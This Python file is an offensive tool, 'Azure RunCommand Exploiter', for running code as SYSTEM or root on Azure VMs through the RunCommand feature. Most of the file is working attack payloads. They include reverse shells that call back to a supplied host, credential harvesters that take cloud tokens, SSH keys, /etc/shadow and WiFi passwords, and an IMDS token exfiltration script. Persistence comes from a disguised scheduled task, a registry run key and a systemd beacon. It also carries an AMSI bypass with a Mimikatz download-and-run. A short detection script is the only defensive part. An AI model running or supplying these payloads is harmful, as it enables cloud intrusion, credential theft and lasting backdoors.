#!/usr/bin/env python3
"""
Azure RunCommand Exploiter - VM Agent Remote Code Execution
===========================================================
Azure VM Agent yüklü sunucularda, RDP şifresi bilmeden "RunCommand" 
özelliği ile SYSTEM yetkisinde komut çalıştırma modülü.

Author: CyberPunk Team
Version: 1.0.0 PRO
"""

import json
import base64
import secrets
import hashlib
import re
import threading
import queue
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from enum import Enum
import urllib.request
import urllib.parse
import urllib.error


class AzureRegion(Enum):
    """Azure regions"""
    EAST_US = "eastus"
    EAST_US_2 = "eastus2"
    WEST_US = "westus"
    WEST_US_2 = "westus2"
    CENTRAL_US = "centralus"
    NORTH_CENTRAL_US = "northcentralus"
    SOUTH_CENTRAL_US = "southcentralus"
    WEST_CENTRAL_US = "westcentralus"
    NORTH_EUROPE = "northeurope"
    WEST_EUROPE = "westeurope"
    UK_SOUTH = "uksouth"
    UK_WEST = "ukwest"
    FRANCE_CENTRAL = "francecentral"
    GERMANY_WEST_CENTRAL = "germanywestcentral"
    SWITZERLAND_NORTH = "switzerlandnorth"
    NORWAY_EAST = "norwayeast"
    EAST_ASIA = "eastasia"
    SOUTHEAST_ASIA = "southeastasia"
    JAPAN_EAST = "japaneast"
    JAPAN_WEST = "japanwest"
    AUSTRALIA_EAST = "australiaeast"
    AUSTRALIA_SOUTHEAST = "australiasoutheast"
    BRAZIL_SOUTH = "brazilsouth"
    CANADA_CENTRAL = "canadacentral"
    CANADA_EAST = "canadaeast"
    KOREA_CENTRAL = "koreacentral"
    INDIA_CENTRAL = "centralindia"
    UAE_NORTH = "uaenorth"


class VMOSType(Enum):
    """VM operating system types"""
    WINDOWS = "Windows"
    LINUX = "Linux"


class CommandStatus(Enum):
    """Command execution status"""
    PENDING = "Pending"
    RUNNING = "Running"
    SUCCEEDED = "Succeeded"
    FAILED = "Failed"
    CANCELED = "Canceled"
    UNKNOWN = "Unknown"


@dataclass
class AzureCredentials:
    """Azure credentials container"""
    tenant_id: str
    client_id: str
    client_secret: str
    subscription_id: str
    access_token: Optional[str] = None
    token_expiry: Optional[datetime] = None
    
    def is_token_valid(self) -> bool:
        """Check if access token is still valid"""
        if not self.access_token or not self.token_expiry:
            return False
        return datetime.now() < self.token_expiry
    
    def to_dict(self) -> Dict:
        return {
            "tenant_id": self.tenant_id,
            "client_id": self.client_id,
            "subscription_id": self.subscription_id,
            "has_token": bool(self.access_token),
            "token_valid": self.is_token_valid()
        }


@dataclass
class AzureVM:
    """Azure Virtual Machine"""
    vm_id: str
    name: str
    resource_group: str
    location: AzureRegion
    os_type: VMOSType
    vm_size: str
    private_ip: Optional[str] = None
    public_ip: Optional[str] = None
    vm_agent_version: Optional[str] = None
    vm_agent_status: str = "Unknown"
    power_state: str = "Unknown"
    tags: Dict[str, str] = field(default_factory=dict)
    
    def supports_run_command(self) -> bool:
        """Check if VM supports RunCommand"""
        return self.vm_agent_status in ["Ready", "Succeeded", "Healthy"]
    
    def to_dict(self) -> Dict:
        return {
            "vm_id": self.vm_id,
            "name": self.name,
            "resource_group": self.resource_group,
            "location": self.location.value,
            "os_type": self.os_type.value,
            "vm_size": self.vm_size,
            "private_ip": self.private_ip,
            "public_ip": self.public_ip,
            "vm_agent_version": self.vm_agent_version,
            "vm_agent_status": self.vm_agent_status,
            "power_state": self.power_state,
            "supports_run_command": self.supports_run_command()
        }


@dataclass
class CommandExecution:
    """Command execution result"""
    execution_id: str
    vm_name: str
    resource_group: str
    command: str
    status: CommandStatus
    output: str = ""
    error: str = ""
    start_time: str = field(default_factory=lambda: datetime.now().isoformat())
    end_time: Optional[str] = None
    exit_code: Optional[int] = None
    
    def to_dict(self) -> Dict:
        return {
            "execution_id": self.execution_id,
            "vm_name": self.vm_name,
            "resource_group": self.resource_group,
            "command": self.command[:100] + "..." if len(self.command) > 100 else self.command,
            "status": self.status.value,
            "output": self.output,
            "error": self.error,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "exit_code": self.exit_code
        }


class AzureRunCommandExploiter:
    """
    Azure RunCommand Exploiter
    ==========================
    Exploit Azure VM Agent's RunCommand feature for remote code execution.
    
    Features:
    - Token acquisition via Service Principal
    - VM enumeration across subscriptions
    - RunCommand execution (PowerShell/Bash)
    - SYSTEM privilege command execution
    - Persistence establishment
    - Credential harvesting
    """
    
    # Azure API endpoints
    AZURE_LOGIN_URL = "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
    AZURE_MANAGEMENT_URL = "https://management.azure.com"
    API_VERSION_COMPUTE = "2023-09-01"
    API_VERSION_NETWORK = "2023-06-01"
    
    # Built-in RunCommand IDs
    WINDOWS_RUN_COMMANDS = {
        "RunPowerShellScript": "RunPowerShellScript",
        "RunShellScript": "RunShellScript",
        "DisableWindowsUpdate": "DisableWindowsUpdate",
        "EnableAdminAccount": "EnableAdminAccount",
        "EnableRemotePS": "EnableRemotePS",
        "EnableUserAccount": "EnableUserAccount",
        "IPConfig": "ipconfig",
        "RDPSettings": "RDPSettings",
        "ResetRDPCert": "ResetRDPCert",
        "SetRDPPort": "SetRDPPort"
    }
    
    LINUX_RUN_COMMANDS = {
        "RunShellScript": "RunShellScript",
        "ifconfig": "ifconfig",
        "InstallAntimalware": "InstallAntimalware"
    }
    
    def __init__(self, credentials: Optional[AzureCredentials] = None):
        self.credentials = credentials
        self.vms: List[AzureVM] = []
        self.executions: List[CommandExecution] = []
        self._lock = threading.Lock()
    
    def set_credentials(self, tenant_id: str, client_id: str, 
                       client_secret: str, subscription_id: str):
        """Set Azure credentials"""
        self.credentials = AzureCredentials(
            tenant_id=tenant_id,
            client_id=client_id,
            client_secret=client_secret,
            subscription_id=subscription_id
        )
    
    def _get_access_token(self) -> str:
        """Get Azure access token via OAuth2"""
        
        if self.credentials.is_token_valid():
            return self.credentials.access_token
        
        url = self.AZURE_LOGIN_URL.format(tenant=self.credentials.tenant_id)
        
        data = urllib.parse.urlencode({
            "grant_type": "client_credentials",
            "client_id": self.credentials.client_id,
            "client_secret": self.credentials.client_secret,
            "scope": "https://management.azure.com/.default"
        }).encode()
        
        request = urllib.request.Request(url, data=data, method='POST')
        request.add_header('Content-Type', 'application/x-www-form-urlencoded')
        
        try:
            with urllib.request.urlopen(request, timeout=30) as response:
                result = json.loads(response.read().decode())
                
                self.credentials.access_token = result['access_token']
                expires_in = result.get('expires_in', 3600)
                self.credentials.token_expiry = datetime.now() + timedelta(seconds=expires_in - 60)
                
                return self.credentials.access_token
        except Exception as e:
            raise Exception(f"Failed to get access token: {str(e)}")
    
    def _api_request(self, endpoint: str, method: str = 'GET', 
                     data: Dict = None) -> Dict:
        """Make authenticated API request"""
        
        token = self._get_access_token()
        
        url = f"{self.AZURE_MANAGEMENT_URL}{endpoint}"
        
        request = urllib.request.Request(url, method=method)
        request.add_header('Authorization', f'Bearer {token}')
        request.add_header('Content-Type', 'application/json')
        
        if data:
            request.data = json.dumps(data).encode()
        
        try:
            with urllib.request.urlopen(request, timeout=60) as response:
                return json.loads(response.read().decode())
        except urllib.error.HTTPError as e:
            error_body = e.read().decode() if e.fp else str(e)
            raise Exception(f"API error {e.code}: {error_body}")
    
    def enumerate_vms(self, resource_group: str = None) -> List[AzureVM]:
        """Enumerate VMs in subscription"""
        
        if resource_group:
            endpoint = (f"/subscriptions/{self.credentials.subscription_id}"
                       f"/resourceGroups/{resource_group}"
                       f"/providers/Microsoft.Compute/virtualMachines"
                       f"?api-version={self.API_VERSION_COMPUTE}")
        else:
            endpoint = (f"/subscriptions/{self.credentials.subscription_id}"
                       f"/providers/Microsoft.Compute/virtualMachines"
                       f"?api-version={self.API_VERSION_COMPUTE}")
        
        result = self._api_request(endpoint)
        vms = []
        
        for vm_data in result.get('value', []):
            vm = self._parse_vm(vm_data)
            if vm:
                vms.append(vm)
                
                # Get instance view for agent status
                self._get_vm_instance_view(vm)
        
        with self._lock:
            self.vms = vms
        
        return vms
    
    def _parse_vm(self, vm_data: Dict) -> Optional[AzureVM]:
        """Parse VM data from API response"""
        
        try:
            properties = vm_data.get('properties', {})
            os_profile = properties.get('osProfile', {})
            storage_profile = properties.get('storageProfile', {})
            
            # Determine OS type
            if os_profile.get('windowsConfiguration'):
                os_type = VMOSType.WINDOWS
            elif os_profile.get('linuxConfiguration'):
                os_type = VMOSType.LINUX
            else:
                image_ref = storage_profile.get('imageReference', {})
                offer = image_ref.get('offer', '').lower()
                os_type = VMOSType.LINUX if 'linux' in offer or 'ubuntu' in offer else VMOSType.WINDOWS
            
            # Extract resource group from ID
            vm_id = vm_data.get('id', '')
            rg_match = re.search(r'/resourceGroups/([^/]+)/', vm_id)
            resource_group = rg_match.group(1) if rg_match else ''
            
            # Parse location
            location_str = vm_data.get('location', 'eastus')
            try:
                location = AzureRegion(location_str)
            except ValueError:
                location = AzureRegion.EAST_US
            
            return AzureVM(
                vm_id=vm_id,
                name=vm_data.get('name', ''),
                resource_group=resource_group,
                location=location,
                os_type=os_type,
                vm_size=properties.get('hardwareProfile', {}).get('vmSize', 'Unknown'),
                tags=vm_data.get('tags', {})
            )
        except Exception:
            return None
    
    def _get_vm_instance_view(self, vm: AzureVM):
        """Get VM instance view for agent status"""
        
        endpoint = (f"/subscriptions/{self.credentials.subscription_id}"
                   f"/resourceGroups/{vm.resource_group}"
                   f"/providers/Microsoft.Compute/virtualMachines/{vm.name}"
                   f"/instanceView?api-version={self.API_VERSION_COMPUTE}")
        
        try:
            result = self._api_request(endpoint)
            
            # Get VM agent status
            vm_agent = result.get('vmAgent', {})
            vm.vm_agent_version = vm_agent.get('vmAgentVersion')
            
            statuses = vm_agent.get('statuses', [])
            for status in statuses:
                if 'Ready' in status.get('displayStatus', ''):
                    vm.vm_agent_status = 'Ready'
                    break
            
            # Get power state
            for status in result.get('statuses', []):
                code = status.get('code', '')
                if code.startswith('PowerState/'):
                    vm.power_state = code.split('/')[1]
                    break
            
            # Get network info
            for nic in result.get('networkProfile', {}).get('networkInterfaces', []):
                self._get_nic_info(vm, nic.get('id'))
                
        except Exception:
            pass
    
    def _get_nic_info(self, vm: AzureVM, nic_id: str):
        """Get NIC information for IP addresses"""
        
        if not nic_id:
            return
        
        endpoint = f"{nic_id}?api-version={self.API_VERSION_NETWORK}"
        
        try:
            result = self._api_request(endpoint)
            
            for ip_config in result.get('properties', {}).get('ipConfigurations', []):
                props = ip_config.get('properties', {})
                vm.private_ip = props.get('privateIPAddress')
                
                public_ip = props.get('publicIPAddress', {})
                if public_ip.get('id'):
                    # Would need another API call to get actual public IP
                    pass
                    
        except Exception:
            pass
    
    def run_command(self, vm: AzureVM, command: str, 
                   command_id: str = None) -> CommandExecution:
        """Execute command on VM via RunCommand"""
        
        if vm.os_type == VMOSType.WINDOWS:
            command_id = command_id or "RunPowerShellScript"
        else:
            command_id = command_id or "RunShellScript"
        
        endpoint = (f"/subscriptions/{self.credentials.subscription_id}"
                   f"/resourceGroups/{vm.resource_group}"
                   f"/providers/Microsoft.Compute/virtualMachines/{vm.name}"
                   f"/runCommand?api-version={self.API_VERSION_COMPUTE}")
        
        payload = {
            "commandId": command_id,
            "script": [command] if isinstance(command, str) else command
        }
        
        execution = CommandExecution(
            execution_id=secrets.token_hex(8),
            vm_name=vm.name,
            resource_group=vm.resource_group,
            command=command if isinstance(command, str) else '\n'.join(command),
            status=CommandStatus.PENDING
        )
        
        try:
            result = self._api_request(endpoint, method='POST', data=payload)
            
            # Parse result
            value = result.get('value', [])
            if value:
                message = value[0].get('message', '')
                execution.output = message
                execution.status = CommandStatus.SUCCEEDED
            else:
                execution.status = CommandStatus.FAILED
                execution.error = "No output returned"
            
        except Exception as e:
            execution.status = CommandStatus.FAILED
            execution.error = str(e)
        
        execution.end_time = datetime.now().isoformat()
        
        with self._lock:
            self.executions.append(execution)
        
        return execution
    
    # ==================== ATTACK PAYLOADS ====================
    
    def generate_windows_reverse_shell(self, callback_host: str, 
                                        callback_port: int) -> str:
        """Generate PowerShell reverse shell payload"""
        
        ps_script = f'''
$client = New-Object System.Net.Sockets.TCPClient("{callback_host}", {callback_port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
        return ps_script.strip()
    
    def generate_linux_reverse_shell(self, callback_host: str,
                                      callback_port: int) -> str:
        """Generate Bash reverse shell payload"""
        
        bash_script = f'''
bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1
'''
        return bash_script.strip()
    
    def generate_credential_harvester_windows(self) -> str:
        """Generate Windows credential harvesting script"""
        
        ps_script = '''
# Azure credential harvester - runs as SYSTEM

$results = @{}

# Get Azure CLI credentials
$azureCliPath = "$env:USERPROFILE\\.azure"
if (Test-Path $azureCliPath) {
    $results["azure_cli"] = @{
        "accessTokens" = if (Test-Path "$azureCliPath\\accessTokens.json") { Get-Content "$azureCliPath\\accessTokens.json" | ConvertFrom-Json } else { $null }
        "azureProfile" = if (Test-Path "$azureCliPath\\azureProfile.json") { Get-Content "$azureCliPath\\azureProfile.json" | ConvertFrom-Json } else { $null }
    }
}

# Get Azure PowerShell tokens
$azPsPath = "$env:USERPROFILE\\.Azure"
if (Test-Path $azPsPath) {
    $results["azure_powershell"] = @{
        "TokenCache" = if (Test-Path "$azPsPath\\TokenCache.dat") { [Convert]::ToBase64String([IO.File]::ReadAllBytes("$azPsPath\\TokenCache.dat")) } else { $null }
        "AzureRmContext" = if (Test-Path "$azPsPath\\AzureRmContext.json") { Get-Content "$azPsPath\\AzureRmContext.json" | ConvertFrom-Json } else { $null }
    }
}

# Get environment variables with secrets
$results["env_vars"] = @{}
$sensitiveVars = @("AZURE", "AWS", "GCP", "API", "KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL")
foreach ($var in (Get-ChildItem env:)) {
    foreach ($pattern in $sensitiveVars) {
        if ($var.Name -match $pattern) {
            $results["env_vars"][$var.Name] = $var.Value
        }
    }
}

# Get IMDS token
try {
    $imdsToken = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -ErrorAction SilentlyContinue
    $results["imds_token"] = $imdsToken
} catch {}

# Get WiFi passwords (bonus)
$results["wifi_passwords"] = @()
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
foreach ($profile in $profiles) {
    $key = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
    if ($key) {
        $results["wifi_passwords"] += @{ "ssid" = $profile; "password" = $key }
    }
}

# Get Chrome/Edge passwords (encrypted but collectible)
$results["browser_data_locations"] = @()
$chromePath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
$edgePath = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
if (Test-Path $chromePath) { $results["browser_data_locations"] += $chromePath }
if (Test-Path $edgePath) { $results["browser_data_locations"] += $edgePath }

# Get saved RDP connections
$results["rdp_connections"] = Get-ChildItem "HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers" -ErrorAction SilentlyContinue | ForEach-Object {
    @{
        "server" = $_.PSChildName
        "username" = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).UsernameHint
    }
}

# Output as JSON
$results | ConvertTo-Json -Depth 5
'''
        return ps_script.strip()
    
    def generate_credential_harvester_linux(self) -> str:
        """Generate Linux credential harvesting script"""
        
        bash_script = '''#!/bin/bash
# Azure credential harvester - runs as root

echo "{"

# Azure CLI credentials
echo '"azure_cli": {'
if [ -f ~/.azure/accessTokens.json ]; then
    echo '"accessTokens": '
    cat ~/.azure/accessTokens.json
    echo ','
fi
if [ -f ~/.azure/azureProfile.json ]; then
    echo '"azureProfile": '
    cat ~/.azure/azureProfile.json
fi
echo '},'

# SSH keys
echo '"ssh_keys": ['
for key in ~/.ssh/id_*; do
    if [ -f "$key" ] && [[ "$key" != *.pub ]]; then
        echo "{\\"file\\": \\"$key\\", \\"content\\": \\"$(base64 -w0 $key)\\"},"
    fi
done 2>/dev/null
echo '],'

# AWS credentials
echo '"aws_credentials": {'
if [ -f ~/.aws/credentials ]; then
    echo '"credentials": "'
    base64 -w0 ~/.aws/credentials
    echo '",'
fi
if [ -f ~/.aws/config ]; then
    echo '"config": "'
    base64 -w0 ~/.aws/config
    echo '"'
fi
echo '},'

# GCP credentials
echo '"gcp_credentials": {'
if [ -f ~/.config/gcloud/credentials.db ]; then
    echo '"credentials_db": "'
    base64 -w0 ~/.config/gcloud/credentials.db
    echo '"'
fi
echo '},'

# Environment variables
echo '"env_vars": {'
env | grep -iE "(azure|aws|gcp|api|key|secret|token|password|credential)" | while read line; do
    key=$(echo "$line" | cut -d= -f1)
    value=$(echo "$line" | cut -d= -f2-)
    echo "\\"$key\\": \\"$value\\","
done
echo '},'

# IMDS token
echo '"imds_token": '
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || echo "null"
echo ','

# /etc/shadow (if accessible)
echo '"shadow": "'
cat /etc/shadow 2>/dev/null | base64 -w0
echo '",'

# History files
echo '"history": {'
echo '"bash_history": "'
cat ~/.bash_history 2>/dev/null | tail -100 | base64 -w0
echo '",'
echo '"zsh_history": "'
cat ~/.zsh_history 2>/dev/null | tail -100 | base64 -w0
echo '"'
echo '}'

echo "}"
'''
        return bash_script.strip()
    
    def generate_persistence_windows(self, callback_host: str, 
                                      callback_port: int) -> str:
        """Generate Windows persistence payload"""
        
        ps_script = f'''
# Establish persistence via scheduled task

$taskName = "AzureMonitoringAgent"
$command = @"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
\\$c = New-Object System.Net.Sockets.TCPClient('{callback_host}',{callback_port})
\\$s = \\$c.GetStream()
[byte[]]\\$b = 0..65535|%{{0}}
while((\\$i = \\$s.Read(\\$b,0,\\$b.Length)) -ne 0){{
    \\$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$b,0,\\$i)
    \\$r = (iex \\$d 2>&1 | Out-String)
    \\$sb = ([text.encoding]::ASCII).GetBytes(\\$r)
    \\$s.Write(\\$sb,0,\\$sb.Length)
    \\$s.Flush()
}}
\\$c.Close()
"
"@

# Create scheduled task (runs every 15 minutes)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)))"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

# Also add to registry
$regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
$regName = "AzureAgent"
$regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)))"
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force

Write-Output "[+] Persistence established"
Write-Output "[+] Scheduled task: $taskName"
Write-Output "[+] Registry run key: $regName"
'''
        return ps_script.strip()
    
    def generate_persistence_linux(self, callback_host: str,
                                   callback_port: int) -> str:
        """Generate Linux persistence payload"""
        
        bash_script = f'''#!/bin/bash
# Establish persistence via cron and systemd

CALLBACK="{callback_host}"
PORT="{callback_port}"

# Create beacon script
cat > /tmp/.azure-monitor.sh << 'BEACON'
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1
    sleep 300
done
BEACON
chmod +x /tmp/.azure-monitor.sh
mv /tmp/.azure-monitor.sh /usr/local/bin/.azure-monitor.sh 2>/dev/null || true

# Add cron job
(crontab -l 2>/dev/null; echo "*/15 * * * * /usr/local/bin/.azure-monitor.sh >/dev/null 2>&1") | crontab -

# Create systemd service
cat > /etc/systemd/system/azure-monitor.service << 'SERVICE'
[Unit]
Description=Azure Monitoring Agent
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.azure-monitor.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
SERVICE

systemctl daemon-reload
systemctl enable azure-monitor.service
systemctl start azure-monitor.service

echo "[+] Persistence established"
echo "[+] Cron job: every 15 minutes"
echo "[+] Systemd service: azure-monitor"
'''
        return bash_script.strip()
    
    def generate_mimikatz_download(self) -> str:
        """Generate script to download and run Mimikatz"""
        
        ps_script = '''
# Download and execute Mimikatz

$mimikatzUrl = "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
$tempPath = "$env:TEMP\\mimi.zip"
$extractPath = "$env:TEMP\\mimi"

# Bypass AMSI
$a = [Ref].Assembly.GetTypes() | ForEach-Object { if ($_.Name -like "*iUtils") { $_ } }
$b = $a.GetFields('NonPublic,Static') | ForEach-Object { if ($_.Name -like "*Context") { $_ } }
$c = $b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32($c, 0x41414141)

# Download
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $mimikatzUrl -OutFile $tempPath

# Extract
Expand-Archive -Path $tempPath -DestinationPath $extractPath -Force

# Run
$arch = if ([Environment]::Is64BitProcess) { "x64" } else { "Win32" }
$exe = "$extractPath\\$arch\\mimikatz.exe"

# Execute commands
& $exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | Out-String

# Cleanup
Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
'''
        return ps_script.strip()
    
    def generate_imds_exfil(self) -> str:
        """Generate IMDS metadata exfiltration script"""
        
        ps_script = '''
# Exfiltrate Azure IMDS metadata

$metadata = @{}
$imdsBase = "http://169.254.169.254/metadata"

# Instance metadata
try {
    $metadata["instance"] = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "$imdsBase/instance?api-version=2021-02-01"
} catch {}

# Identity tokens for various resources
$resources = @(
    "https://management.azure.com/",
    "https://vault.azure.net",
    "https://storage.azure.com/",
    "https://database.windows.net/",
    "https://graph.microsoft.com/",
    "https://dev.azure.com"
)

$metadata["tokens"] = @{}
foreach ($resource in $resources) {
    try {
        $token = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "$imdsBase/identity/oauth2/token?api-version=2018-02-01&resource=$resource"
        $metadata["tokens"][$resource] = $token
    } catch {}
}

# Scheduled events
try {
    $metadata["scheduled_events"] = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "$imdsBase/scheduledevents?api-version=2020-07-01"
} catch {}

# Attested data
try {
    $metadata["attested"] = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "$imdsBase/attested/document?api-version=2020-09-01"
} catch {}

$metadata | ConvertTo-Json -Depth 10
'''
        return ps_script.strip()
    
    # ==================== CLI COMMAND GENERATORS ====================
    
    def generate_az_cli_commands(self, vm: AzureVM, command: str) -> List[str]:
        """Generate Azure CLI commands for RunCommand"""
        
        commands = []
        
        # Login
        commands.append("# Login to Azure")
        commands.append(f"az login --service-principal -u {self.credentials.client_id} "
                       f"-p {self.credentials.client_secret} "
                       f"--tenant {self.credentials.tenant_id}")
        commands.append("")
        
        # Set subscription
        commands.append("# Set subscription")
        commands.append(f"az account set --subscription {self.credentials.subscription_id}")
        commands.append("")
        
        # Run command
        commands.append("# Execute RunCommand")
        if vm.os_type == VMOSType.WINDOWS:
            commands.append(f'''az vm run-command invoke \\
  --resource-group {vm.resource_group} \\
  --name {vm.name} \\
  --command-id RunPowerShellScript \\
  --scripts '{command}'
''')
        else:
            commands.append(f'''az vm run-command invoke \\
  --resource-group {vm.resource_group} \\
  --name {vm.name} \\
  --command-id RunShellScript \\
  --scripts '{command}'
''')
        
        return commands
    
    def generate_powershell_commands(self, vm: AzureVM, command: str) -> List[str]:
        """Generate Azure PowerShell commands"""
        
        commands = []
        
        # Login
        commands.append("# Login to Azure")
        commands.append(f'''$cred = New-Object PSCredential("{self.credentials.client_id}", (ConvertTo-SecureString "{self.credentials.client_secret}" -AsPlainText -Force))
Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant "{self.credentials.tenant_id}"
''')
        
        # Set subscription
        commands.append("# Set subscription")
        commands.append(f'Set-AzContext -SubscriptionId "{self.credentials.subscription_id}"')
        commands.append("")
        
        # Run command
        commands.append("# Execute RunCommand")
        script_param = "ScriptPath" if command.endswith('.ps1') else "ScriptString"
        commands.append(f'''Invoke-AzVMRunCommand `
  -ResourceGroupName "{vm.resource_group}" `
  -VMName "{vm.name}" `
  -CommandId "RunPowerShellScript" `
  -{script_param} '{command}'
''')
        
        return commands
    
    def generate_detection_script(self) -> str:
        """Generate script to detect RunCommand abuse"""
        
        script = '''
# Azure RunCommand Abuse Detection Script

# 1. Check Azure Activity Logs for RunCommand events
Write-Host "[*] Checking Azure Activity Logs for RunCommand events..."

$startTime = (Get-Date).AddDays(-7)
$logs = Get-AzActivityLog -StartTime $startTime | Where-Object {
    $_.OperationName.Value -like "*runCommand*" -or
    $_.OperationName.Value -like "*RunCommand*"
}

foreach ($log in $logs) {
    Write-Host "  Time: $($log.EventTimestamp)"
    Write-Host "  Operation: $($log.OperationName.Value)"
    Write-Host "  Caller: $($log.Caller)"
    Write-Host "  Status: $($log.Status.Value)"
    Write-Host "  Resource: $($log.ResourceId)"
    Write-Host ""
}

# 2. Check for suspicious scheduled tasks (Windows)
Write-Host "[*] Checking for suspicious scheduled tasks..."
Get-ScheduledTask | Where-Object {
    $_.TaskName -match "Azure|Monitor|Agent" -and
    $_.Author -ne "Microsoft Corporation"
} | ForEach-Object {
    Write-Host "  Task: $($_.TaskName)"
    Write-Host "  Author: $($_.Author)"
    Write-Host "  State: $($_.State)"
    $actions = ($_ | Get-ScheduledTaskInfo).TaskPath
    Write-Host "  Path: $actions"
    Write-Host ""
}

# 3. Check for suspicious processes
Write-Host "[*] Checking for suspicious PowerShell processes..."
Get-Process -Name powershell, pwsh -ErrorAction SilentlyContinue | ForEach-Object {
    $cmdLine = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)").CommandLine
    if ($cmdLine -match "EncodedCommand|hidden|bypass|TCP") {
        Write-Host "  PID: $($_.Id)"
        Write-Host "  CommandLine: $cmdLine"
        Write-Host ""
    }
}

# 4. Check Windows Event Logs
Write-Host "[*] Checking Windows Event Logs for VM Agent activity..."
Get-WinEvent -LogName "Microsoft-WindowsAzure-Diagnostics/GuestAgent" -MaxEvents 100 -ErrorAction SilentlyContinue | 
    Where-Object { $_.Message -match "RunCommand|script" } |
    ForEach-Object {
        Write-Host "  Time: $($_.TimeCreated)"
        Write-Host "  Message: $($_.Message.Substring(0, [Math]::Min(200, $_.Message.Length)))..."
        Write-Host ""
    }

Write-Host "[+] Detection scan complete"
'''
        return script.strip()
    
    def get_summary(self) -> Dict:
        """Get summary of operations"""
        return {
            "total_vms": len(self.vms),
            "vms_with_agent": sum(1 for vm in self.vms if vm.supports_run_command()),
            "windows_vms": sum(1 for vm in self.vms if vm.os_type == VMOSType.WINDOWS),
            "linux_vms": sum(1 for vm in self.vms if vm.os_type == VMOSType.LINUX),
            "total_executions": len(self.executions),
            "successful_executions": sum(1 for e in self.executions 
                                         if e.status == CommandStatus.SUCCEEDED),
            "failed_executions": sum(1 for e in self.executions 
                                    if e.status == CommandStatus.FAILED)
        }


# Singleton instance
_exploiter = None

def get_exploiter() -> AzureRunCommandExploiter:
    """Get singleton exploiter instance"""
    global _exploiter
    if _exploiter is None:
        _exploiter = AzureRunCommandExploiter()
    return _exploiter


def demo():
    """Demonstrate Azure RunCommand exploitation"""
    print("=" * 60)
    print("Azure RunCommand Exploiter - VM Agent RCE")
    print("=" * 60)
    
    exploiter = get_exploiter()
    
    print("\n[*] Available attack payloads:")
    print("    - Windows/Linux reverse shell")
    print("    - Credential harvester (Azure CLI, SSH keys, env vars)")
    print("    - Persistence (scheduled tasks, systemd)")
    print("    - IMDS token exfiltration")
    print("    - Mimikatz download & execute")
    
    print("\n[*] Built-in Windows RunCommands:")
    for cmd_id in list(exploiter.WINDOWS_RUN_COMMANDS.keys())[:5]:
        print(f"    - {cmd_id}")
    
    print("\n[*] Built-in Linux RunCommands:")
    for cmd_id in exploiter.LINUX_RUN_COMMANDS.keys():
        print(f"    - {cmd_id}")
    
    print("\n[*] Supported Azure regions:", len(AzureRegion))
    
    # Sample credential harvester
    print("\n[*] Sample credential harvester (Windows):")
    print("-" * 40)
    harvester = exploiter.generate_credential_harvester_windows()
    print(harvester[:500] + "...")
    
    print("\n[*] Ready for exploitation (set credentials first)")
    print("-" * 60)


if __name__ == "__main__":
    demo()
